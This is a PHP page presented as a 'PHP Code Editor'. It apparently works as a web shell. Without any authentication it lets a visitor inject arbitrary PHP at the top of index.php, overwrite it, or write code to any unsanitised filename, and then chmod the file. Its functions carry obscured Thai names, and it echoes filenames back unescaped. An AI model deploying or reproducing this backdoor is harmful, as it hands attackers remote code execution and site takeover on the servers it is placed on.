<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Code Editor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            line-height: 1.6;
            background-color: #f4f4f9;
            color: #333;
        }
        h1 {
            text-align: center;
            color: #444;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        textarea {
            width: 100%;
            height: 150px;
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
        }
        label {
            font-weight: bold;
        }
        input[type="text"], input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
        }
        input[type="submit"] {
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .result {
            background: #e9ffe9;
            color: #008000;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
        .error {
            background: #ffe9e9;
            color: #a80000;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PHP Code Editor</h1>
        <p>Easily edit, append, or create PHP files on your server without direct file uploads.</p>
        <form method="POST">
            <div class="form-group">
                <label for="php_code">PHP Code:</label>
                <textarea id="php_code" name="php_code" placeholder="Enter PHP code here. Example: &lt;?php echo 'Hello world!'; ?&gt;"></textarea>
            </div>

            <div class="form-group">
                <label>Action:</label>
                <input type="radio" id="append" name="action" value="append" checked>
                <label for="append">Append code to the top of index.php</label><br>
                <input type="radio" id="overwrite" name="action" value="overwrite">
                <label for="overwrite">Overwrite index.php</label><br>
                <input type="radio" id="newfile" name="action" value="newfile">
                <label for="newfile">Create a new file</label>
            </div>

            <div class="form-group">
                <input type="text" name="filename" placeholder="New file name (if creating a new file)">
            </div>

            <div class="form-group">
                <input type="checkbox" id="change_permission" name="change_permission" value="yes">
                <label for="change_permission">Change file permission to 0600</label>
            </div>

            <input type="submit" name="submit" value="Submit">
        </form>

        <?php
        // Fungsi custom dengan nama Thailand
        function เขียนไฟล์($ไฟล์, $เนื้อหา) {
            return file_put_contents($ไฟล์, $เนื้อหา);
        }

        function อ่านไฟล์($ไฟล์) {
            return file_exists($ไฟล์) ? file_get_contents($ไฟล์) : '';
        }

        function เปลี่ยนสิทธิ์ไฟล์($ไฟล์, $สิทธิ์) {
            return chmod($ไฟล์, $สิทธิ์);
        }

        // Memproses permintaan jika tombol Submit ditekan
        if (isset($_POST['submit'])) {
            $php_code = $_POST['php_code'];
            $action = $_POST['action'];
            $filename = !empty($_POST['filename']) ? $_POST['filename'] : 'index.php';
            $change_permission = isset($_POST['change_permission']);

            if (!empty($php_code)) {
                if ($action == 'append') {
                    $existing_code = อ่านไฟล์($filename);
                    $new_content = $php_code . "\n" . $existing_code;
                    เขียนไฟล์($filename, $new_content);
                    echo "<div class='result'>PHP code has been added to the top of $filename.</div>";
                } elseif ($action == 'overwrite') {
                    เขียนไฟล์($filename, $php_code);
                    echo "<div class='result'>The contents of $filename have been overwritten.</div>";
                } elseif ($action == 'newfile') {
                    เขียนไฟล์($filename, $php_code);
                    echo "<div class='result'>New file ($filename) has been created.</div>";
                }

                if ($change_permission) {
                    เปลี่ยนสิทธิ์ไฟล์($filename, 0600);
                    echo "<div class='result'>The file permission for $filename has been changed to 0600 (owner-only read/write).</div>";
                }
            } else {
                echo "<div class='error'>Please enter PHP code.</div>";
            }
        }
        ?>
    </div>
</body>
</html>
